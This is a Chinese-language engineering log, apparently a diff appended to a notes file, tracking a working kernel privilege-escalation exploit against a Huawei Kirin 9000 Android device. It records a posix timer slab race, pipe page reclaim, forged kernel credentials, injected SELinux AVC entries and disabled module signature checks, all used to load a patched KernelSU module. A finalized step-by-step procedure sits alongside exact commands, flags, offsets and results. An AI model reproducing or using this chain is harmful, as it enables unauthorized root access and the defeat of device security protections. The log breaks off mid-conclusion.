+  [B2d] groups=22 满30=20 | 30:1825618 30:2586946 30:2039086 30:2350572 30:2350262
+        30:3239382 30:3241460 30:2383894
+  [B2a] arm_i=29 addr=0xffffff81bdb53ed0
+  [B2b] pfn=1825618 cnt=30 arm_i=29 | node=0xffffff81bdb53f58 pfn=1825619 head=1825618
+  [B2e] recs=632 okc=631 多=1 非满组=1 | 31:1741152!
+  [B2f] 放行
+  [B7] slabinfo(pre-go) 1110 1110 272 30 2 slabdata 37 → 闸门弃用
+  ---- attempt 3/3 ----
+  [B2h] filler pid=31201 造 120 timer；holes=0（filler=4）
+  [B2] victim=31204 tid=31205 timers=631 | recs=631 slabs=22 last_slab=1746232
+  [B2d] groups=22 满30=21 | 30:2350314 30:1746078 30:2350396 30:1746540 30:2350500
+        30:2350348 30:2350342 30:1994510
+  [B2a] arm_i=29 addr=0xffffff823dcebed0
+  [B2b] pfn=2350314 cnt=30 arm_i=29 | node=0xffffff823dcebf58 pfn=2350315 head=2350314
+  [B7] slabinfo(pre-go) 1230 1230 272 30 2 slabdata 41 → 闸门弃用
+  == VERDICT: 3 次尝试全部未拿到
+  设备: 未 panic，uptime 1894s 连续；系统正常（未加载 ko）
+  ★关键对比:
+     a24 命中: go+415us det+22us kill+437us（victim comm 在 kill 时仍为 timer-exec）
+     a25 未中: go+448us det+27us kill+475us（comm 已变 'exe' → exec 已完成）
+     → 命中窗口对 go→det 的抖动极敏感，差值仅 ~38us
+  ★几何结论（再次确认）: 每 boot 只能容纳 1 次有效 attempt
+     基线 6 个 slab，attempt1 后 slabdata=32（+26），attempt2/3 必然 ≥37/41 超 33 闸门
+     原因: victim 631 timer + filler ~150 timer 归整后空 slab 仍留在 cache（SLUB 不立即 shrink）
+  ★策略: 用「跨 boot 重试」把链路成功做成 100% —— 每 boot 一次干净 attempt，未中立即自动重启重试
+
+[a25 同 boot 追加轮（清残留试验）] 2026-11-06 08:09（boot 572a0968，uptime ~1900s）
+  现状实测: 12 个 wr93a25 残留进程存活（filler 4 个 + 主线/线程）
+  slabinfo 实测: 600/720 272 30 2 slabdata 24（active 600 = 残留 filler 的 timer；系统自身基线约 180 objs/6 slabs）
+  操作: killall -9 wr93a25 → slabdata 24 → 12（active 182/360，剩 6 空 slab 未回收）
+  BURST pre_slabdata=12 wait=0x2s
+    attempt1 [B2] victim timers=631 | recs=647 okc=631 多=16 非满组=1（16 条泄漏记录来自系统其它 timer）
+             [B7] 1110/1110 272 30 2 slabdata 37 → 闸门弃用
+    attempt2 [B7] 37 → 弃用；attempt3 [B7] 41 → 弃用
+    VERDICT: 3 次全部未拿到
+  ★几何硬账（由实测反推，决定「能否 3 次/ boot」）:
+     victim 631 timer = 21 slab；filler 1 个 ≈150 timer = 5 slab；系统基线 = 6 slab（180 objs）
+     闸门阈值 33（历史 slabdata>=36 全部 panic）
+     6 + 21 + 5 = 32 ✓ 仅当基线=6（纯 pristine boot）才过闸
+     基线 12（残留空 slab 未回收）→ 12+21+5 = 37 ✗ 必被拦
+     ⇒ 同一 boot 里 attempt2/3 必然被拦，不是参数问题，是 SLUB 空 slab 回收与 33 闸门的算术冲突
+  ★尝试清理空 slab（需要 root 写 /sys/kernel/slab/posix_timers_cache/shrink）:
+     /data/local/tmp/dirtyinit id                       → uid=0(root) context=u:r:init:s0 ✓
+     /data/local/tmp/dirtyinit 'echo 1 > …/shrink'      → Permission denied ✗
+     /data/local/tmp/dirtyinit 'cat …/shrink'           → Permission denied ✗
+     shell: ls -l …/shrink                              → Permission denied ✗
+     ⇒ SELinux 禁止（连 init 域都读不到 /sys/kernel/slab），此路径不可用
+  ★结论: 每 boot 只能有 1 次有效 attempt（基线必须是 pristine 6 slab）；
+          提升总成功率只能靠「未中→自动重启→重试」的跨 boot 循环
+  ★命中窗口对比（同一 -W 逻辑）:
+     a24 命中: go+415us det+22us kill+437us（kill 时 comm 仍 timer-exec）
+     a25 未中: go+448us det+27us kill+475us（kill 落地时 comm 已变 'exe'，exec 已完成）
+     → 命中与否取决于 go→de_thread 抖动（±40us 量级），单次成功率 ≈50%
+
+[a25 第 2 枪 —— 命中并停在「可加载 ko」] 2026-11-06 08:21（boot 55e0f8f4，-k 不加载 ko，跑完即停）
+  boot_id: 55e0f8f4-34bb-40e6-a5a9-9ce6f9aa3fe4
+  起手基线（uptime 330s）: posix_timers_cache 180 180 272 30 2 slabdata 6  ← 唯一能过闸的 pristine 态
+  relay: am instrument --user 15 -w com.root.adbinvoke/...InvokeRoot
+         → result=Guarded handler invoked once
+  tracing_on=1
+  slide=0x1ffe800000 base=0xffffffe00e800000（raw_values=4 hits=3）
+  设备端 wr93a25 md5=1ea6514a2cf0defeb9d4a47cf434e5ff（与主机一致）
+  参数: setsid ./wr93a25 -I -U FCIMP -k -t -W -s 0x1ffe800000 -n 631 -p 60 -g 8 -y 1200 -a 3
+  ---- attempt 1/3 —— HIT ----
+  [ENTER] pid=17372 argc=19
+  [SAFE] oom_score_adj=-1000
+  [B0c] cred_cs=0xffffffe00e9e38d4 timer_cs=0xffffffe00eabf748 task_cs=0xffffffe00e9930a8 self_tid=17372
+        slide=0x1ffe800000
+  [B0a] thread_clock=1 file_spray=0MB attempts=3 force_hit=0 selfverify=0 kill_us=-1
+  [B0] uid=2000 euid=2000 gid=2000 egid=2000
+  [B0d] raw pipes=6 (cpu0..5)
+  [B1a] probe=17394 setresgid(2000)=0 errno=1
+  [B1b] kmem_cache_alloc 记录 128 条；最后 6 条 cs/req:
+        0xffffffe00ed0c560/344  0xffffffe00e8be5d4/16  0xffffffe00e8a009c/192
+        0xffffffe00ec8e8a0/192  0xffffffe00ec8e8a0/192  0xffffffe00e8a239c/64
+  [B1] cred records=2 va=0xffffff8282c7c240 | probe_task records=1 va=0xffffff8231b94b00
+       [1] kind=0 va=0xffffff822a8473c0
+       [110] kind=0 va=0xffffff8282c7c240 delta=0x58434e80
+       task [0] kind=2 va=0xffffff8231b94b00
+  [B6] fillers ready=6 [CDEFBA]
+  [R0b] 轮 1/1 t=437650ms oom=-1000 cgroup=[8:groupsched:/default]
+  [B2h] filler pid=17410 造 115 timer；pid=17411 造 29 timer；holes=0（filler=2）
+  [B2] victim=17413 tid=17414 timers=631 holes=0 | recs=631 slabs=22 last_slab=3206592
+  [B2d] groups=22 满30=20 | 前 8 组 29:2073836 30:1240820 30:1240822 30:3020404
+        30:3020406 30:2081768 30:2081770 30:2081772
+  [B2a] arm_i=58 = last_idx-1 addr=0xffffff812eef5ed0
+  [B2b] slab pfn=1240820 cnt=30 arm_i=58 | node=0xffffff812eef5f58 off=0xf58
+        pfn=1240821 head=1240820（目标页=1240821, tail页）
+  [B2c] GFP_KERNEL → UNMOVABLE(0) order=1；discard 回 free_list[1]；pipe(GFP_HIGHUSER) 同链表
+  [B2e] 原始几何(未删 timer): 631 全保留, tv[58] 为全局最后创建
+  [B7] slabinfo(pre-go) 930 930 272 30 2 slabdata 31（<33 通过）
+  [K] de_thread 完成(comm='timer-exec', 距 go 571us) → 立即 SIGKILL
+  [B8] zombie=Z comm='timer-exec' in 73585us | ku=-1 | reads=64 opens=128588 err=0
+       go+546us det+25us kill+571us
+  ★ WINDOW HIT (attempt 1)
+  [B8b] slabinfo(at-hit) 930 930 272 30 2 slabdata 31
+  [B12F] 伪 cred @0xffffff812eef5100 (page+0x100) tsec @0xffffff812eef51c0 (sid 初值 0)
+  [B12A] 伪 avc_node @0xffffff812eef51f0 (page+0x1f0)
+  [B12T] 整页自洽 slots=10 skip=5（每槽 parent=(misc-8)|1 right=Pnode left=0）
+  [B12I] 插入模板 off=0xf58 aux=0x400 P=0xffffff812eef5400 Pnode=0xffffff812eef5418
+         Q=0xffffff812eef5580 F=0xffffff812eef5640 misc_list=0xffffffe011dc7860
+  [B12c] pipe#0 F_SETPIPE_SZ ret=1048576 F_GETPIPE_SZ=1048576；pipes=60（每 pipe 256 页）
+  [B13] round1 pages=2048 in 150020us | free(n=2 mt=-1) alloc(node pfn=1240821 n=0) cum_free=2
+        trace: pfn=1240820 order=1 @446.928860 (进程 13) 与 @447.088713（wr93a25-17372）
+        round2 pages=2048 in 154108us | free=0
+        alloc(node pfn=1240821 n=1 mine=1 mine_unmov=1 mt=0 order=0) cum_free=2
+        trace: mm_page_alloc pfn=1240821 order=0 migratetype=0 GFP_HIGHUSER @447.320278
+  [B14] head pfn=1240820 归本进程 alloc=0（仅参考）
+  [B15] GATE=PASS (mine_unmov=1 mine=1 any=1) | alloc_round=2 free_cnt=2
+  [B15w] 抢到后 800ms 监听: extra_free=0 prev_free=2 arund=2 → 安全
+  [B16] REAP 17413 → [B17] reap done status=0x9（写原语执行）
+  [B20] open /dev/uhid → 134 (errno=11)
+  [B21] repair pwrite=128 errno=0（expect 128）
+  [B22] open2 /dev/uhid → 135 (errno=0)
+  == VERDICT: STAGE1 桥就绪（fd*2 命中）
+  [B19] stage1 完成 rc=0
+  [F] probe pid=17394 task=0xffffff8231b94b00 fake_cred=0xffffff812eef5100 tsec=0xffffff812eef51c0
+  [F] sig_enforce(0xffffffe011d2d468) <- 0 rc=0
+  [F] real_cred/cred -> 0xffffff812eef5100 rc=0
+  [F] 命中 sid=68 -> u:r:init:s0 ★
+  [F] task->pid/tgid(0x878) <- 0 rc=0
+  [F] avc_node key ssid=tsid=68 rc=0
+  [F] avc_node pprev(+0x30) <- bucket 0xffffffe0121476c8 rc=0
+  [F] avc slots[276] -> fake_list 0xffffff812eef5218 rc=0
+  [A17] const_caps_ready 0xffffffe011ffc6bc <- 1 rc=0 | bti key 0xffffffe011ffc660 <- 0 rc=0
+  [F] -k: 已走到「可加载 ko」状态（uid0/满caps/init域/AVC 已注入），不唤醒 probe、不调 init_module
+  [F] stage1+伪 cred 链验证完成 → 驻留(pipe/别名页保持占用, 不释放)
+  ★ 结果: 1/1 attempt 命中，链路 100% 走通，且未加载 ko
+  ★ 链路耗时实测（本标准从此作为基准）:
+      [R0b] t=437650ms（开火进程启动）→ trace kill/alloc 446.93~447.32s  = 9.3s（启动→窗口命中）
+      命中→驻留: [B15w] 800ms + B13 round1 150.02ms + round2 154.11ms + reap/stage1  ≈ 2s
+      纯链路（wr93a25 启动→-k 驻留） ≈ 11s
+      端到端（reboot→可开火） ≈ 438s（7.3min）；其中硬性等待 uptime≥300s + relay/tracing/kaslr/push ≈ 100~130s
+      注: 11s 中含 631 timer 建树 + 6 filler 填洞（B0→B7），真正开窗仅 kill 前后约 0.6ms
+  设备收尾实测(uptime 482s, 同 boot 55e0f8f4):
+    adb shell id → uid=2000 context=u:r:shell:s0（exec 正常，系统未受影响）
+    posix_timers_cache 301/450 272 30 2 slabdata 15
+    ps 中 wr93a25 进程=10（-k 驻留，pipe/别名页保持占用）
+  ★ 命中时机对比（三次单 attempt）:
+    a24: go+415us det+22us kill+437us → HIT（加载了 ko）
+    a25#1: go+448us det+27us kill+475us → MISS
+    a25#2: go+546us det+25us kill+571us → HIT（kill 时 comm 仍 timer-exec）
+    ⇒ 决定命中与否的不是 go→kill 的绝对时长，而是 kill 落地瞬间 victim 是否还停在 timer-exec（de_thread 未完成）
+
+[标准链路 SOP —— 2026-11-06 定稿，以后一律照此走]
+  1. 重启后等 uptime>=300s，并确认 posix_timers_cache = 180 180 ... slabdata 6（pristine），否则直接换 boot
+  2. am instrument --user 15 -w com.root.adbinvoke/com.root.adbinvoke.InvokeRoot（必须见 result=Guarded handler invoked once）
+  3. echo 1 > /sys/kernel/tracing/tracing_on 并回读为 1
+  4. sh /data/local/tmp/kaslr_self.sh 现算 slide（raw_values>=2 hits>=2），禁止沿用旧值
+  5. push 未烘焙模块/二进制 → 写 cur_slide → chmod 755 → 起后台 sync 循环
+  6. 设备端脚本开火: setsid ./<bin> -I -U FCIMP -k -t -W -s <slide> -n 631 -p 60 -g 8 -y 1200 -a 3
+  7. 判据: [B7] slabdata<=33；[K]/[B8] kill 时 comm 仍 timer-exec；[B15] mine_unmov=1；[B15w] extra_free=0；[B17] status=0x9
+  8. 验链路一律加 -k（停在「可加载 ko」，不唤醒 probe、不调 init_module）
+  9. 一 boot 一枪：基线 6 → 6+21+5=32 过闸；基线 12 → 37 必拦（attempt2/3 必被拦，算术约束）
+ 10. 收尾实测 uptime/boot_id/id/slabinfo/驻留进程数，全部数值落到本文件
+
+[源码校准 —— 5.10.43 内核真值 vs 模块假设] 2026-11-06
+  源码: D:\98260\ksrc9000（android_kernel_huawei_kirin9000-main.zip 解压 78989 文件，zip 局部损坏）
+  设备配置(/proc/config.gz): MTE 未开；PTR_AUTH/BTI/CFI_CLANG/LTO/SHADOW_CALL_STACK 开；KRETPROBES/KPROBES 未开；4K 页
+  ---- kernel.raw 反汇编真值 ----
+  el0_sync 向量 (vectors+0x400 = 0xffffffc010082400): sub sp,sp,#0x150  → sizeof(pt_regs)=0x150
+  el0_svc_common (0xffffffc010173af4): stp x10,x11,[x19,#0x110]（orig_x0=0x110）；str w21,[x19,#0x118]（syscallno=0x118）
+      dispatch: cmp w21,#0x1b8；CFI 慢路径校验后 ldr x20,[x20,w8,uxtw#3] 再 blr
+      NO_SYSCALL(-1) 分支: mov x8,#-0x26(-ENOSYS); str x8,[x19]
+  get_wchan (0xffffffc01015f96c): ldr x8,[x19,#0x20] → task->stack=0x20
+  THREAD_SIZE=0x4000 → task_pt_regs = stack+0x4000-0x150 = stack+0x3EB0
+  ⇒ 模块 ksu_sys_enter_handler 的 stack+0x3EF0 = regs[8]（orig id）、stack+0x3FC8 = syscallno，全部正确
+  sys_call_table 真值(link) = 0xffffffc012c15258（441 项，全部为 .cfi_jt 桩）
+     ni 桩 = 0xffffffc01222c738，表内出现 146 次，首个 index=42
+     execve[221]=0xffffffc01222d140  execveat[281]=…  setresuid[145]=…  newfstatat[79]=…  faccessat[48]=…
+  ---- 模块实现（反汇编）----
+  ksu_syscall_hook_init(0x4c4,208B): 解析 sys_call_table(kallsyms) → ksu_find_ni_syscall_slots(扫描表项==ni) → 记 dispatcher_nr → ksu_syscall_table_hook(nr, dispatcher) → ksu_patch_text
+  ksu_syscall_table_hook(0x3068,400B): 读原槽 → 存 hooked_entries → patch_syscall_table(nr, fn)
+  ksu_sys_enter_handler: ldr x8,[sp_el0,#0x20]；tbnz dispatcher_nr<0 → return；hooks[id]==0 → return；否则 写 regs[8]=id、regs->syscallno=dispatcher_nr
+  ksu_syscall_dispatcher(0x3454,104B): w8=[regs+0x118]；若 != dispatcher_nr → -ENOSYS；orig=[regs+0x40]；orig==w8 → -ENOSYS；
+      orig>0x1b8 → -ENOSYS；syscall_hooks[orig]==0 → -ENOSYS；否则 syscall_hooks[orig](…)（.bss 数组 3528B=441×8）
+  ---- ADB 全哑的成因判定 ----
+  观测: execve/fstatat/faccessat/setresuid 全部返回 -ENOSYS，其它 syscall 正常，系统不 panic（adb 文件服务随 exec 失败报 EIO）
+  机理: sys_enter handler 把 syscallno 改成 dispatcher_nr 后，内核 dispatch 取 sys_call_table[dispatcher_nr]；
+        若该槽的 patch 未生效（仍是 ni 桩）→ 该 syscall 一律 -ENOSYS；若生效但目标为模块函数，
+        内核 CFI 慢路径/类型校验不通过会 panic（实测未 panic）→ 指向「patch 未真正落盘」
+  结论(暂定): 不是偏移错（偏移已证全部正确），而是 dispatcher 槽的 patched 值未生效/未被内核采纳，
+        使被 hook 的 5 个 syscall 全部落回 ni 桩的 -ENOSYS
+  ---- 已产出的校准模块 ----
+  kk18s3.ko = kk18_base2 + 两处入口桩化:
+    ksu_syscall_hook_init(0x4c4)        → mov w0,#0 ; ret
+    ksu_syscall_hook_manager_init(0x334) → mov w0,#0 ; ret
+  md5 8eb26fa78cabfc4cddc7e12166f3a907   （不注册 sys_enter、不改 sys_call_table、不建 dispatcher → execve 不可能被改成 -ENOSYS）
+  预期: kernelsu_init 跑完 + ADB 全程存活；代价: sucompat 钩子暂不生效（后续单独修 dispatcher 落盘问题）
+
+[a26 第 1 轮 —— kk18s3 校准模块（桩化 syscall hook）] 2026-11-06
+  boot_id: ba676812-4ca2-4a67-aff7-e68191278044
+  起手: uptime 307s，posix_timers 180 180 272 30 2 slabdata 6（pristine 通过）
+  relay: result=Guarded handler invoked once；tracing_on=1
+  slide=0x2b7a400000 base=0xffffffeb8a400000（raw_values=4 hits=3）
+  kodelta: patched=188 old=0x22f9c00000 new=0x2b7a400000 delta=0x880800000
+  模块 md5: 8eb26fa78cabfc4cddc7e12166f3a907（kk18s3，未烘焙原值）
+  ---- 3 次尝试全部在窗口前被几何闸弃用（未开窗、未 panic）----
+    attempt1 [B2e] recs=636 okc=631 多=5 非满组=2 | 满30=15/22 arm_i=58 alias=5 → 弃用
+    attempt2 [B2e] recs=637 okc=631 多=6 非满组=1 | 满30=15/22 arm_i=29 alias=6 → 弃用
+    attempt3 [B2e] recs=637 okc=631 多=6 非满组=1 | 31:297908! 31:2533830! | 满30=15/22 alias=6 → 弃用
+  == VERDICT: 3 次尝试全部未拿到 (hit+discard)；uptime 连续（无 panic）
+  收尾: uptime 382s；设备存活（本轮未发生 init_module）
+  备注: 本 boot 的 timer 几何明显变差（满30 仅 15/22，而 a25 命中轮为 20/22），
+        说明 victim 631 timer 的落板分布对本 boot 的 alloc 顺序敏感；需换 boot 重试
+
+=== a26 验证轮 · boot 3c254d21 (pristine 直接开火, 未重启) ===
+[准备] 09:44 baseline slabdata=6 (posix_timers_cache 180 180 272 30 2 : slabdata 6 6 0)
+         uptime 740.53 3143.23 | slide 0x15ef000000 | tracing_on=1 | 无驻留进程
+         kk18s3.ko 原始 md5 8eb26fa78cabfc4cddc7e12166f3a907 (3534080 B)
+         kodelta 后 md5 39a12bf4403b1aa9d3386336e3ea8f4f (patched=188 old=0x22f9c00000 new=0x15ef000000 delta=0xfffffff2f5400000)
+[开火] 09:58:10  pid=19659 ncpu=6 vcpu=1 ntimer=631 nfill=6 npipe=60 clock=THREAD spray=pipe
+         cred_cs=0xffffffd5ff1e38d4 timer_cs=0xffffffd5ff2bf748 task_cs=0xffffffd5ff1930a8
+         B1 cred recs=2 va=0xffffff82afdeeb40 | task recs=1 va=0xffffff82501c0000 | stage1 misc_list
+         probe=19690 setresgid(2000)=0 errno=1 | kmem_cache_alloc records=128
+[attempt 1/3] filler 19711=142 timers, 19712=29 timers, holes=0 filler=2
+         victim=19718 tid=19719 timers=631 slabs=22 last_slab=2254504
+         groups=22 满30=20 | 前8组: 29:2056734 30:2525970 30:2254422 30:2254460 30:2254462 30:2254472 30:2254474 30:2254476
+         arm_i=58 addr=0xffffff8268b13ed0 | slab pfn=2525970 cnt=30 node=0xffffff8268b13f58 off=0xf58 pfn=2525971 head=2525970
+         pre-go slabinfo 960 960 272 30 2 : slabdata 32 32 0
+         de_thread 407us → kill | zombie in 64029us comm='exe' ku=-1 reads=61 opens=106638 err=0 | go+381us det+26us kill+407us
+         → MISS (exec 正常完成), 安全 reap
+[attempt 2/3] filler 19821=149 timers, holes=0 filler=3
+         victim=19825 tid=19826 timers=631 last_slab=2251936 groups=22 满30=21
+         arm_i=29 addr=0xffffff82266a9ed0 | slab pfn=2254504 cnt=30 node=0xffffff82266a9f58 off=0xf58 pfn=2254505 head=2254504
+         pre-go slabdata=37 → 闸 slabdata 37 > 33 弃用
+[attempt 3/3] filler 19863=120 timers, holes=0 filler=4
+         victim=19864 tid=19865 recs=646 slabs=22 last_slab=2056712 groups=22 满30=6
+         arm_i=29 addr=0xffffff8225ca1ed0 | slab pfn=2251936 cnt=30 node=0xffffff8225ca1f58 off=0xf58 pfn=2251937 head=2251936
+         记录归属: recs=646 okc=631 多=15 非满组=1 | 31:2254666! 31:2254602! 31:2254604! 31:2254610! 31:2549496! 31:2254658! 31:2254612! 31:2254208!
+         → 几何脏 (recs=646/631 满30=6/22 arm_i=29 alias=15) 弃用
+[VERDICT] 3 次尝试全部未拿到 (hit+discard)
+[后状态] 09:58:32 boot 3c254d21-3cfa-4bed-b69a-be52e4be7cca (未变) uptime 846.84 3605.58
+         id=uid=2000(shell) 正常 | posix_timers_cache 600 720 272 30 2 : slabdata 24 24 0
+[结论] kk18s3 本轮未获得加载窗口; 设备与 ADB 全程健康; 需重启进下一轮
+
+=== a26 并发事故轮 · boot 374bf7d8 (被重复实例重启打断) ===
+[CYCLE 1] 09:59:18 reboot → boot 484d9396-... | slabdata 6 | slide 0x161ca00000 | fire 10:05:07 → 45s 后 device offline (无日志留存)
+[CYCLE 2] 10:05:53 reboot → boot c0b51e92-... | slabdata 6 | slide 0x1aaaa00000 | fire 10:10:40 → 45s 后 device offline (无日志留存)
+[CYCLE 3] 10:11:25 reboot → boot 374bf7d8-... | slabdata 6 | slide 0x1aaae00000 | fire 10:16:12 → offline
+[CYCLE 4] 10:11:47 (重复实例) 同 boot 374bf7d8 | fire 10:16:35 slide=0x1aaae00000 → 日志完整留存
+  [开火] pid=15657 ncpu=6 vcpu=1 ntimer=631 nfill=6 npipe=60
+        slide=0x1aaae00000 cred_cs=0xffffffdabafe38d4 timer_cs=0xffffffdabb0bf748 task_cs=0xffffffdabaf930a8
+        B1 cred recs=2 va=0xffffff88183cb000 | task recs=1 va=0xffffff83576c0000 | stage1 misc_list
+        probe=15683 setresgid(2000)=0 errno=1 | kmem_cache_alloc recs=128
+        R0b t=318073ms cgroup=[8:groupsched:/default]
+  [attempt 1/3] filler 15762=115 timers, 15793=29 timers, holes=0 filler=2
+        victim=15827 tid=15828 timers=631 recs=631 slabs=22 last_slab=3188274
+        groups=22 满30=20 | 前8组: 29:296698 30:3132114 30:3409356 30:3409358 30:3132212 30:3132214 30:301160 30:301162
+        arm_i=58 addr=0xffffff82fcad3ed0 | slab pfn=3132114 cnt=30 node=0xffffff82fcad3f58 off=0xf58 pfn=3132115 head=3132114
+        pre-go slabdata=31
+        de_thread 440us → kill | zombie in 50981us comm='timer-exec' ku=-1 reads=64 opens=118645 err=0 | go+418us det+22us kill+440us
+        == WINDOW HIT (attempt 1)
+        at-hit slabdata=31 | 伪cred 0xffffff82fcad3100 (page+0x100) tsec 0xffffff82fcad31c0 | 伪avc 0xffffff82fcad31f0 (page+0x1f0)
+        整页自洽 slots=10 skip=5 | 插入模板 off=0xf58 aux=0x400 P=0xffffff82fcad3400 Pnode=0xffffff82fcad3418 Q=0xffffff82fcad3580 F=0xffffff82fcad3640 misc_list=0xffffffdabe3c7860
+        pipe#0 F_SETPIPE_SZ(1MB)=1048576 | pipes=60
+        round1 pipe 2048 pages in 150018us | free(n=1 mt=-1) alloc(pfn=3132115 n=0 mine=0 mt=-1 order=-1) cum_free=1
+              mm_page_free page pfn=3132114 order=1 @327.099728
+        round2 2048 pages 150082us | free(n=0) → 目标页未分配
+        round3 2048 pages 150031us | free(n=0) → 目标页未分配
+        round4 2048 pages 150049us | free(n=0) alloc(pfn=3132115 n=1 mine=1 mine_unmov=1 mt=0 order=0) cum_free=1
+              mm_page_alloc pfn=3132115 order=0 migratetype=0 GFP_HIGHUSER @328.187475  ← 抢页成功
+        [日志在此截断: uptime 328.187s, 与重复实例 Adobe reboot(10:17:20)同时, 非 panic 证据]
+[事故] 终止重复实例 PID 6416/18028 (job-0ac42dfe, -MaxCycles 8)
+[网络恢复] 电脑 192.168.86.111 (eLinehub vNet, gw 192.168.86.1) ping 2/2 1ms; adb connect 后 device online
+[当前] boot 69e2310b-7a33-449b-8cbd-fb707d981df5 uptime 222.80s (10:20:10) slabdata 6 pristine, 等待 ≥300s 干净单发
+
+=== 干净单发 · boot f4a20327 → 崩溃重启 (kk18s3 验证结果) ===
+[PRE 10:29:09] boot f4a20327 uptime 393.37 1602.36 slabdata 6 pristine | md5(kk18s3)=8eb26fa7... (未被打补丁的原始副本)
+[准备] instrument=Guarded handler invoked once | kaslr slide=0x2964e00000 | tracing_on=1 | cur_slide 写入成功
+[开火 10:29:31-53] FIRE rc=0 out=FIRED | 无其它实例并发
+[10:29:58 起] adb offline (连续 12 次, 约 65s)
+[10:31:04] 设备恢复: 新 boot 265b3137-a92c-4b38-8c63-81e247579677 | uptime 78.55 | slabdata 6
+[证据] /data/local/tmp/a26.log 3723 B 全为 0x00 (od -c 全 \0) → 崩溃时页缓存未落盘, 日志丢失
+         md5(kk18s3) 仍为 8eb26fa7 → kodelta 的原地补丁同样未落盘
+[判定] kk18s3 (已桩化 syscall hook init + manager init) 开火后设备在 ~13s 内重启, boot_id 改变
+        → 崩溃不来自 syscall hook 注册; 在加载链更深处 (stage2 注入 / init_module / KSU init) 触发
+        → 与 a24 的"ADB 静默 ENOSYS 不重启"是两种不同失败形态
+[网络根因] 本机唯一默认路由 0.0.0.0/0 → 192.168.86.1 (WLAN, 即车机设备本身)
+        OrayBoxVpnEnt 172.16.0.18 无默认路由, ping -S 172.16.0.18 8.8.8.8 100% 失败 → 无法接管外网
+        ⇒ 设备重启必然导致 PC 断网/Trae 会话"网络已断开"; 只能靠少重启 + 本地长脚本自愈, 无法改路由绕过
+[改进] 下次开火改为前台流式捕获 (adb exec-out 直读, PC 侧 1s 粒度落盘), 不再依赖设备端日志文件
+
+=== 离线定位崩溃点 (2026-11-06, kk18s4 产物) ===
+[方法] 用 disasm_reloc.py 解析 .rela.* 还原真实调用目标 (修正 sh_link 与 r_offset+val 两处偏差后)
+[init 调用图 kernelsu_init @.init.text 0x0 size=0x1e8]
+  prepare_creds → ksu_cred
+  ksu_init_symbol_resolver
+  ksu_syscall_hook_init            ← s3 桩化 / s2 保留
+  ksu_sulog_init / ksu_adb_root_init / ksu_supercall_dump_commands
+  [late_loaded=1 分支] printk → ksu_install_backup_sepolicy → apply_kernelsu_rules(0x1e8)
+    → cache_sid → setup_ksu_cred → escape_to_root_for_init
+    → ksu_load_allow_list → ksu_syscall_hook_manager_init ← s3 桩化 / s2 保留
+    → ksu_observer_init ← s3 放行 / s2 桩化
+    → ksu_file_wrapper_init ← s3 放行 / s2 桩化
+    → ksu_boot_completed=1 → track_throne(FORCE_SYNCHRONOUS) → kobject_del → ret 0
+[二进制对比]
+  kk18s2 vs kk18_base2: 仅 16 字节, 0x7370(.text ksu_observer_init) + 0x17844(.init.text ksu_file_wrapper_init)
+  kk18s3 vs kk18_base2: 仅 16 字节, 0x17548(.init.text ksu_syscall_hook_manager_init) + 0x176d8(.init.text ksu_syscall_hook_init)
+  ⇒ kk18s3 恰好放开了 s2 一直屏蔽的 observer/file_wrapper, 这是两者唯一行为差异
+[函数性质]
+  ksu_file_wrapper_init: anon_inode_getfile("dummy",&tmp,NULL,0) → 取 dummy->f_path.mnt → fput; 无 fsnotify
+  ksu_observer_init: fsnotify_alloc_group → kern_path("/data/system") → ihold → kmem_cache_alloc_trace
+                     → fsnotify_init_mark → fsnotify_add_mark → (失败路径 fsnotify_put_mark/path_put/iput)
+  ⇒ 二者都要走 cred->security/SELinux 路径; 本链在伪 cred 上下文执行 init_module, 最可能在此 panic
+[产物] kk18s4.ko = kk18_base2 + 4 处入口桩化 (hook_init 0x176d8 / hook_manager 0x17548 / observer 0x7370 / file_wrapper 0x17844)
+       长度 3534080, md5 ff23dce1c6411595f2be3d8248a0f802
+[工具修正] D:\98260\logs\disasm_reloc.py: strtab 改用 symtab.sh_link; 重定位键改为 ins.address+func.val
+
+=== ★ kk18s4 验证成功 · boot 265b3137 (2026-11-06 10:49) ===
+[准备 10:48:32] boot 265b3137-a92c-4b38-8c63-81e247579677 uptime 1127.42 slabdata 6 (pristine)
+   md5 kk18s4=ff23dce1c6411595f2be3d8248a0f802 (3534080 B)
+   root=Guarded handler invoked once | kaslr raw_values=5 hits=3 slide16=00000029cf600000
+   slide=0x29cf600000 base=0xffffffe9df600000 | tracing_on=1 | cur_slide 写入校验 OK
+[开火 10:49:13] a27_fire.sh: kodelta patched=188 old=0x22f9c00000 new=0x29cf600000 delta=0x6d5a00000
+   kodelta 后 md5=181c42babe28a8e0ca362f6c0d76e536
+   pid=19070 ncpu=6 vcpu=1 ntimer=631 nfill=6 npipe=60 clock=THREAD spray=pipe attempts=3
+   cred_cs=0xffffffe9df7e38d4 timer_cs=0xffffffe9df8bf748 task_cs=0xffffffe9df7930a8
+   B1 cred records=2 va=0xffffff83279f9600 | probe=19092 setresgid(2000)=0 errno=0 | recs=128
+[阶段] B15w watch=800ms extra_free=0 prev_free=3 arund=2 → B16 reap victim=19110 → B17 status=0x9
+   B20 open /dev/uhid=134 errno=11 | B21 pwrite=128/128 errno=0 | B22 open2=135 errno=0
+   == VERDICT STAGE1 桥就绪 (fd*2 命中) rc=0
+[伪cred 10:49:16 前后] task=0xffffff813b643840 fake_cred=0xffffff81750c3100 tsec=0xffffff81750c31c0
+   sig_enforce(0xffffffe9e2b2d468) <- 0 | real_cred/cred -> 0xffffff81750c3100
+   命中 sid=68 u:r:init:s0 ★ | task->pid/tgid(0x878) <- 0
+   avc_node key ssid=tsid=68 | pprev(+0x30) <- 0xffffffe9e2f476c8 | slots[276] -> 0xffffff81750c3218
+   const_caps_ready 0xffffffe9e2dfc6bc <- 1 | bti key 0xffffffe9e2dfc660 <- 0
+[init_module] probe +0ms comm=wpAAAAAAABBBBBB R | +7ms W0_CALL D | +26ms W1_R0 R | +28ms W2_r0_e0 R
+   root_probe_patch rc=0 | 放行 probe 执行 FCIMP | 模块预读 3534080/3534080 bytes
+[验证 ★]
+   10:49:17 slabdata 6 → 15 (301 active)
+   10:50:38 /proc/modules: kernelsu 147456 0 - Live 0x0 (OE)   ← 模块已驻留内核
+   10:51:31 (再验 45s) boot_id 265b3137 未变 | uptime 1307.16 | slabdata 15 | id=uid=2000 正常
+   ADB 全程在线 (exec-out 命令 rc=0) | wr93a25 主进程 19070 + 9 子进程 S 态驻留
+[结论 1] kk18s4 (桩化 syscall_hook_init / hook_manager_init / observer_init / file_wrapper_init) =>
